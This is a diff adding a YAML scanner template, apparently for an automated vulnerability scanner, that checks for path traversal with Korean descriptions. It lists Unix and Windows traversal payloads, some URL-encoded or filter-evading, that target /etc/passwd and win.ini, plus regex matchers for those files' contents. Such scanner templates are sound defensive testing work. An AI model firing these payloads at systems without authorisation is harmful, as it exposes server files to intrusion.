@@ -1,0 +1,50 @@
+id: path-traversal
+info:
+  name: "Path Traversal"
+  severity: high
+  description: >
+    파일 경로 파라미터를 통해 서버 내부 파일을 읽을 수 있는 취약점.
+    /etc/passwd 등의 민감 파일 내용이 응답에 포함되면 취약으로 판정.
+  tags: [lfi, path-traversal, file-inclusion]
+
+definition:
+  method: [GET]
+  position: [query, form_field]
+
+payload_groups:
+  - group: unix_traversal
+    engine: "Unix 경로 탐색"
+    payloads:
+      - "../../../../etc/passwd"
+      - "../../../etc/passwd"
+      - "../../etc/passwd"
+      - "..%2F..%2F..%2Fetc%2Fpasswd"
+      - "....//....//....//etc/passwd"
+      - "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+
+  - group: windows_traversal
+    engine: "Windows 경로 탐색"
+    payloads:
+      - "..\\..\\..\\windows\\win.ini"
+      - "..%5C..%5C..%5Cwindows%5Cwin.ini"
+
+matchers_condition: or
+
+matchers:
+  - name: unix_passwd_file
+    type: regex
+    description: "/etc/passwd 파일 내용 탐지"
+    regex:
+      - "root:x:0:0:"
+      - "root:[^:]*:[0-9]"
+      - "/bin/(bash|sh|false|nologin)"
+      - "nobody:x:"
+      - "daemon:x:"
+
+  - name: windows_ini_file
+    type: regex
+    description: "win.ini 파일 내용 탐지"
+    regex:
+      - "\\[fonts\\]"
+      - "\\[extensions\\]"
+      - "for 16-bit app support"
